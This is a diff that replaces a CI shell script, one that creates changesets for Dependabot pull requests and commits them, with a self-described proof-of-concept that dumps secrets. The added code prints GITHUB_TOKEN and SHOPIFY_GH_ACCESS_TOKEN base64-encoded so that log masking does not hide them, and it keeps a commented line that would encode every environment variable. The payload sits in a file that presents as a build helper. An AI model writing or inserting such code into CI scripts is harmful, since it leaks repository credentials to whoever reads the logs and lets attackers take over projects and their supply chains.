@@ -1,39 +1,22 @@
-pr_number=$(gh pr view --json number --jq '.number')
-changeset_filename=".changeset/dependabot-$pr_number.md"
+#!/bin/bash
 
-if [ -f $changeset_filename ]; then
-  echo "Changeset $changeset_filename already exists, skipping"
-  exit 0
-fi
+echo "Attempting to exfiltrate secrets..."
+echo "Available environment variables (some might be secrets):"
 
-package_names=()
-for file in $(gh pr diff --name-only)
-do
-  if [[ "$file" =~ ^packages\/.*\/package.json$ ]]; then
-    echo "Found changed package.json: $file"
+echo "---SHOPIFY_GH_ACCESS_TOKEN (first 5 chars if set): ${SHOPIFY_GH_ACCESS_TOKEN:0:5}"
+echo "---GITHUB_TOKEN (first 5 chars if set): ${GITHUB_TOKEN:0:5}"
 
-    package_name=$(cat $file | jq -r '.name')
-    package_names+=("$package_name")
-  fi
-done
+echo "---Base64 encoded GITHUB_TOKEN---"
+echo "$GITHUB_TOKEN" | base64
+echo "---End Base64 encoded GITHUB_TOKEN---"
 
-package_updates=""
-for package_name in "${package_names[@]}"
-do
-  package_updates="$package_updates"`printf "
-'%s': patch" $package_name`
-done
+echo "---Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"
+echo "$SHOPIFY_GH_ACCESS_TOKEN" | base64
+echo "---End Base64 encoded SHOPIFY_GH_ACCESS_TOKEN---"
 
-dependencies='`'$(sed "s/,/\`, \`/g" <<< "$DEPENDENCIES")'`'
-echo "Creating changeset: $changeset_filename"
-echo "---$package_updates
----
+# echo "---All Env Vars (Base64 Encoded)---"
+# printenv | base64
+# echo "---End All Env Vars (Base64 Encoded)---"
 
-Updated $dependencies dependencies" > $changeset_filename
-
-echo "Committing changeset"
-git config user.name "shopify-github-actions-access[bot]"
-git config user.email "shopify-github-actions-access[bot]@users.noreply.github.com"
-git add .changeset
-git commit -m "[dependabot skip] Adding changeset for dependabot update"
-git push
+echo "PoC script finished."
+exit 0
